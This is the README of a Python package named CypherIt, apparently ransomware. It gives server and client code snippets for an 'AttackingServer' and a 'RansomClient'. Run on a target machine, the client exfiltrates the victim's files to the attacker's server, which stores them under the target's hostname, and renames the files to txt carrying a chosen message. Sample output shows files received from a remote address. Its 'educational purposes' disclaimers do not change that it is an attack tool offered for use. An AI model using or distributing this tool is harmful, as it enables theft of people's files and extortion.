CypherIt
========

CypherIt is an intelligent tool which renames all the files to a txt file in a binder.You can write what ever you want.

All the files of the target will be saved in your directory and you can do what ever you want. The name of the directory is the targets hostname

HOW DOES CYPHERIT WORK
======================

If you are familiar to my style of packages. You already know how simple it is

First of all create a server:

Server
------

````python
import CypherIt as ci

ip, port = "127.0.0.1", 1234

server = ci.AttackingServer(ip, port)
server.start()
````

Client
------

````python
import CypherIt as ci

ip, port, path, text = "127.0.0.1", 1234, r"C:\\test", "ALI THE MASTER"
# You have to specify the path because this was just build for educational purposes. So please do not use it for bad thinks

data = ci.RansomClient(ip, port, path, text)
data.start()
````

Output of Server
--------------
````
Waiting for connection....
Connection has been established with ('192.168.0.73', 64328)
98_304 Bytes has been sent to the server
"_" stands for point
18 files have been saved to your directory
Waiting for connection....
````


You always have to run the server first and then the client.

The hostname of the target will be sent to your server

A Directory with the hostname of the target will be created.

All the data of target will be stored in that directory

Additional
=========
* PLEASE DO NOT HACK SOMEONE FOREIGN
* If you see "Connection has been established" at the server than you have to wait a bit for the data to arrive
